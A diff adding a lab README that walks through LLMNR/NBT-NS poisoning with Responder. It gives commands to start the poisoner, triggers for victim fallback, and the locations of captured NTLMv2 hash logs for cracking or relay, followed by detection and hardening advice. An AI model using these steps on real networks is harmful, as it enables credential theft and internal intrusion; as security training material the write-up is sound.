@@ -1,0 +1,254 @@
+Overview
+
+This lab demonstrates how LLMNR (Link-Local Multicast Name Resolution) can be abused in an internal Active Directory environment to capture NTLMv2 authentication hashes when DNS resolution fails.
+
+When a Windows host cannot resolve a name through DNS, it may fall back to LLMNR or NBT-NS. If an attacker answers that request first, the victim may attempt to authenticate to the attacker-controlled host, exposing an NTLM challenge-response hash that can later be cracked offline or used in follow-on attack paths.
+
+Objective
+Identify where LLMNR/NBT-NS fallback occurs
+Poison name resolution requests with Responder
+Capture NTLMv2 hashes
+Prepare captured material for password cracking or relay follow-up
+Demonstrate why LLMNR is a serious internal network weakness
+Tools Used
+Kali Linux
+Responder
+ip / ifconfig
+cat / ls
+Optional: Wireshark for validation
+Lab Environment
+Attacker: Kali Linux
+Victim: Domain-joined Windows workstation
+Target Type: Internal lab environment
+Sanitized Example Values
+Domain: LAB.LOCAL
+Attacker IP: 192.168.x.x
+Victim IP: 192.168.x.x
+User: labuser
+Hostname: WORKSTATION01
+
+All identifiers below are redacted or replaced with generic lab placeholders.
+
+Attack Flow
+Victim attempts to access a hostname/share that DNS cannot resolve
+Victim falls back to LLMNR / NBT-NS
+Attacker responds first using Responder
+Victim attempts NTLM authentication
+Attacker captures NTLMv2 challenge-response hash
+Step 1 – Confirm the Attacker Interface
+
+Before starting Responder, verify the correct network interface.
+
+ip a
+
+or
+
+ifconfig
+
+Identify the interface connected to the internal lab network, such as:
+
+eth0
+ens33
+enp0s3
+Step 2 – Start Responder
+
+Use modern Responder syntax:
+
+sudo responder -I eth0 -dwv
+Flag Breakdown
+-I eth0 → listen on the attacker interface
+-d → enable DHCP-related poisoning support
+-w → enable WPAD rogue proxy responses
+-v → verbose output
+
+Older tutorials may show deprecated flags. Keep the command clean and current.
+
+Step 3 – Trigger Name Resolution Fallback from the Victim
+
+From a Windows client, trigger a bad hostname or UNC path.
+
+Example 1
+\\FAKEHOST\share
+Example 2
+\\UNKNOWNSRV\docs
+Example 3
+
+In File Explorer:
+
+\\INVALIDHOST\files
+
+If DNS fails, Windows may send:
+
+LLMNR
+NBT-NS
+WPAD-related requests
+Step 4 – Observe Captured Authentication
+
+Responder may display output similar to:
+
+[SMB] NTLMv2-SSP Client   : [REDACTED_IP]
+[SMB] NTLMv2-SSP Username : LAB\labuser
+[SMB] NTLMv2-SSP Hash     : labuser::LAB:[REDACTED]:[REDACTED]:[REDACTED]
+
+Possible protocols captured:
+
+SMB
+HTTP
+WPAD
+Step 5 – Review Saved Hash Files
+
+Responder writes captured data to disk.
+
+ls /usr/share/responder/logs
+
+Example file names:
+
+SMB-NTLMv2-SSP-[REDACTED].txt
+HTTP-NTLMv2-[REDACTED].txt
+
+Read a captured file:
+
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-[REDACTED].txt
+Expected Output
+
+A successful capture generally includes:
+
+Source IP of the victim
+Username / domain
+NTLMv2 challenge-response hash
+Protocol used
+
+Example:
+
+labuser::LAB:[REDACTED_CHALLENGE]:[REDACTED_RESPONSE]:[REDACTED_BLOB]
+
+That material can later support:
+
+offline cracking
+credential validation
+relay workflows
+Responder Log Locations
+
+Useful paths:
+
+ls /usr/share/responder/logs
+find /usr/share/responder/logs -type f
+Optional Verification with Wireshark
+
+To confirm the traffic path:
+
+LLMNR
+udp.port == 5355
+NBT-NS
+udp.port == 137
+SMB
+tcp.port == 445
+HTTP / WPAD
+http
+
+This helps verify:
+
+unresolved name request sent
+attacker responded
+authentication attempt followed
+Common Issues
+1. No hashes captured
+
+Check:
+
+wrong interface selected
+victim never triggered fallback
+DNS successfully resolved the name
+traffic segmentation / local firewall interference
+2. Responder starts but no useful traffic
+
+Make sure the victim is actually trying to access:
+
+fake hostnames
+invalid shares
+unresolved UNC paths
+3. WPAD traffic only
+
+This is still useful and may indicate proxy discovery/auth attempts.
+
+Security Impact
+
+LLMNR poisoning can support:
+
+credential exposure
+offline cracking
+relay opportunities
+lateral movement preparation
+
+Even without initial code execution, it can become an entry point into a larger internal attack path.
+
+MITRE ATT&CK Mapping
+T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
+T1187 – Forced Authentication
+T1110.002 – Password Cracking
+T1078 – Valid Accounts
+Detection Ideas
+
+Defenders should monitor for:
+
+unusual LLMNR traffic
+NBT-NS broadcasts for invalid names
+rogue hosts responding to resolution requests
+WPAD auth attempts to unexpected systems
+SMB/HTTP auth to non-standard internal endpoints
+Wireshark Filters
+udp.port == 5355
+udp.port == 137
+tcp.port == 445
+Defensive Controls
+Disable LLMNR via Group Policy
+Disable NBT-NS where possible
+Reduce NTLM exposure
+Monitor WPAD requests
+Enforce stronger internal hardening and segmentation
+Public Posting Safety
+
+Before uploading to GitHub:
+
+replace real domain names with LAB.LOCAL
+mask all usernames
+hide IP addresses
+redact captured hashes
+crop screenshots tightly
+avoid exposing hostnames, tickets, or real internal shares
+Good Public Replacements
+LAB.LOCAL
+labuser
+WORKSTATION01
+192.168.x.x
+[REDACTED_HASH]
+[REDACTED_HOST]
+Recommended Repo Structure
+LLMNR-Poisoning-Responder/
+├── README.md
+├── screenshots/
+│   ├── responder-start.png
+│   ├── victim-trigger.png
+│   ├── capture-redacted.png
+│   └── logs-redacted.png
+└── notes/
+    └── commands.txt
+Command Reference
+ip a
+sudo responder -I eth0 -dwv
+ls /usr/share/responder/logs
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-[REDACTED].txt
+
+Even better, for GitHub screenshots, replace stuff like this:
+
+MARVEL.local\fcastle
+10.0.2.16
+SQLService
+HYDRA-DC
+
+with this:
+
+LAB\labuser
+192.168.x.x
+service_account
+DC01
